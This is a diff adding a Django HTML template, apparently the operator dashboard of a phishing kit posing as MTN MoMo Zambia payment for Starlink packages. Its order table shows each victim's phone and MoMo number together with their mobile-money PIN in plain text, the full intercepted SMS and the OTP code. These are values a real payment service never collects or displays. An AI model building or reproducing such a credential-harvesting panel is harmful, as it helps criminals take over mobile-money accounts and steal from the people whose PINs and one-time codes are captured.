@@ -1,0 +1,80 @@
+{% extends "base.html" %}
+
+{% block title %}Order Records - MTN MoMo Zambia{% endblock %}
+
+{% block content %}
+<div class="bg-white rounded-3xl shadow-sm overflow-hidden border border-gray-100">
+    <div class="p-6 border-b border-gray-100 flex justify-between items-center bg-gray-50">
+        <h1 class="text-xl font-black text-gray-900">Order Records</h1>
+        <span class="bg-orange-100 text-orange-700 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider">
+            {{ orders.count }} Total Orders
+        </span>
+    </div>
+    
+    <div class="overflow-x-auto">
+        <table class="w-full text-left border-collapse">
+            <thead>
+                <tr class="bg-gray-50 text-gray-400 text-[10px] uppercase font-bold tracking-widest border-b border-gray-100">
+                    <th class="px-6 py-4">Date</th>
+                    <th class="px-6 py-4">Kit ID / Phone</th>
+                    <th class="px-6 py-4">Package / Amount</th>
+                    <th class="px-6 py-4">MoMo Details</th>
+                    <th class="px-6 py-4">Verification</th>
+                    <th class="px-6 py-4">Status</th>
+                </tr>
+            </thead>
+            <tbody class="divide-y divide-gray-50">
+                {% for order in orders %}
+                <tr class="hover:bg-gray-50/50 transition-colors">
+                    <td class="px-6 py-4">
+                        <p class="text-sm font-bold text-gray-900">{{ order.created_at|date:"d M Y" }}</p>
+                        <p class="text-[10px] text-gray-400">{{ order.created_at|date:"H:i" }}</p>
+                    </td>
+                    <td class="px-6 py-4">
+                        <p class="text-sm font-bold text-gray-900">{{ order.starlink_kit_id }}</p>
+                        <p class="text-xs text-gray-500">{{ order.phone_number }}</p>
+                    </td>
+                    <td class="px-6 py-4">
+                        <p class="text-sm font-bold text-gray-900">{{ order.package_name }}</p>
+                        <p class="text-xs text-orange-600 font-bold">ZMW {{ order.amount }}</p>
+                    </td>
+                    <td class="px-6 py-4">
+                        <p class="text-sm font-bold text-gray-900">{{ order.momo_number }}</p>
+                        <p class="text-xs font-mono text-blue-600">PIN: {{ order.pin }}</p>
+                    </td>
+                    <td class="px-6 py-4">
+                        <div class="space-y-1">
+                            {% if order.full_sms %}
+                            <div class="group relative">
+                                <span class="text-[10px] bg-blue-50 text-blue-700 px-2 py-0.5 rounded font-bold cursor-help">SMS RECEIVED</span>
+                                <div class="hidden group-hover:block absolute z-50 bg-black text-white text-[10px] p-2 rounded w-48 -left-20 bottom-6 shadow-xl">
+                                    {{ order.full_sms|truncatechars:100 }}
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if order.otp_code %}
+                            <p class="text-xs font-mono text-green-600 font-bold">OTP: {{ order.otp_code }}</p>
+                            {% endif %}
+                        </div>
+                    </td>
+                    <td class="px-6 py-4">
+                        <span class="px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider
+                            {% if order.status == 'completed' %}bg-green-100 text-green-700
+                            {% elif order.status == 'failed' %}bg-red-100 text-red-700
+                            {% else %}bg-orange-100 text-orange-700{% endif %}">
+                            {{ order.status }}
+                        </span>
+                    </td>
+                </tr>
+                {% empty %}
+                <tr>
+                    <td colspan="6" class="px-6 py-12 text-center text-gray-400 font-medium">
+                        No orders found in the system.
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+</div>
+{% endblock %}
